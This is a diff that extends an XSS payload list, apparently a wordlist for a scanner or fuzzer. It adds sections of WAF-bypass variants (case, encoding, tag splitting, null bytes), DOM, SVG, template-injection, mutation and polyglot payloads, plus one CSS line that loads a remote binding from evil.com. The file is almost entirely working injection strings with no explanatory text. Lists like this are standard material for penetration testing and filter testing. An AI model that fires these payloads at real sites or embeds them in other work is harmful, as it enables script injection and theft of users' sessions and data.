@@ -18,3 +18,163 @@ data:text/html,<script>alert('XSS')</script>
 <embed src=javascript:alert('XSS')>
 <details open ontoggle=alert('XSS')>
 <marquee onstart=alert('XSS')>
+
+# ========================================
+# ENHANCED: WAF Bypass - Case Variations
+# ========================================
+<ScRiPt>alert('XSS')</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert('XSS')>
+<SVG/ONLOAD=alert('XSS')>
+<iMg SrC=x OnErRoR=alert(1)>
+
+# ========================================
+# WAF Bypass - Encoding Variations
+# ========================================
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+%253Cscript%253Ealert('XSS')%253C/script%253E
+<script>alert&#40;1&#41;</script>
+<script>al&#x65;rt(1)</script>
+
+# ========================================
+# WAF Bypass - Tag Variations
+# ========================================
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<<script>script>alert(1)</script>
+<script/src=data:,alert(1)>
+<script x>alert(1)</script>
+<script/x>alert(1)</script>
+
+# ========================================
+# WAF Bypass - Event Handler Variations
+# ========================================
+<body/onload=alert(1)>
+<img/src/onerror=alert(1)>
+<img src=x:x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src=x onerror=alert`1`>
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert&#40;1&#41;>
+
+# ========================================
+# WAF Bypass - Null Bytes & Special Chars
+# ========================================
+<scri%00pt>alert(1)</scri%00pt>
+<script>al%00ert(1)</script>
+<img src=x onerror=\x00alert(1)>
+<script>/*</script><script>*/alert(1)</script>
+<script>/***/alert(1)</script>
+
+# ========================================
+# DOM-Based XSS Payloads
+# ========================================
+#<script>alert('DOM-XSS')</script>
+javascript:alert(document.domain)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>setTimeout(alert,1,1)</script>
+<script>setInterval(alert,1,1)</script>
+
+# ========================================
+# Event Handler Payloads (Various)
+# ========================================
+<img src=1 onerror=alert(1)>
+<img src=1 onload=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<select onfocus=alert(1) autofocus></select>
+<textarea onfocus=alert(1) autofocus></textarea>
+<keygen onfocus=alert(1) autofocus>
+<frameset onload=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<math href="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+
+# ========================================
+# SVG XSS Payloads
+# ========================================
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
+<svg><set onbegin=alert(1) attributeName=x></set></svg>
+<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
+
+# ========================================
+# Angular/Vue/React Template Injection
+# ========================================
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{toString().constructor.prototype.charAt=[].join;$eval('x]'+alert(1)+'//');}}
+${alert(1)}
+#{alert(1)}
+<div ng-app ng-csp><script>alert(1)</script></div>
+<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+
+# ========================================
+# mXSS (Mutation XSS) Payloads
+# ========================================
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
+<style>*{background:url("</style><img src=x onerror=alert(1)>")</style>
+<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)//">
+
+# ========================================
+# Polyglot XSS Payloads
+# ========================================
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
+'">><marquee><img src=x onerror=alert(1)></marquee></script></title></style></textarea></noscript></xmp></option>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//
+-->'"/></sCript><deTailS open x]  ontoggle=(co\u006teletionce)();>
+
+# ========================================
+# XSS in URL/href Context
+# ========================================
+javascript:alert(1)//
+javascript://comment%0aalert(1)
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# ========================================
+# XSS in CSS Context
+# ========================================
+</style><script>alert(1)</script>
+expression(alert(1))
+background:url(javascript:alert(1))
+-moz-binding:url(http://evil.com/xss.xml#xss)
+
+# ========================================
+# XSS Filter Bypass (Modern)
+# ========================================
+<img src=x onerror=alert`1`>
+<img src=x onerror=confirm`1`>
+<img src=x onerror=prompt`1`>
+<img src=x onerror=alert(1)/*>
+<img/src=x/onerror=alert(1)>
+<img%0asrc=x%0aonerror=alert(1)>
+<img%09src=x%09onerror=alert(1)>
+<img%0dsrc=x%0donerror=alert(1)>
+
+# ========================================
+# XSS via HTML5 Tags
+# ========================================
+<video><source onerror=alert(1)>
+<audio src onerror=alert(1)>
+<input type=image src=x onerror=alert(1)>
+<isindex action=javascript:alert(1) type=image>
+<form><button formaction=javascript:alert(1)>click
+<form id=test></form><button form=test formaction=javascript:alert(1)>click
+
+# ========================================
+# JSON/API XSS Payloads
+# ========================================
+{"name":"<script>alert(1)</script>"}
+{"value":"<img src=x onerror=alert(1)>"}
+<script>alert(1)</script>
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\x3cscript\x3ealert(1)\x3c/script\x3e
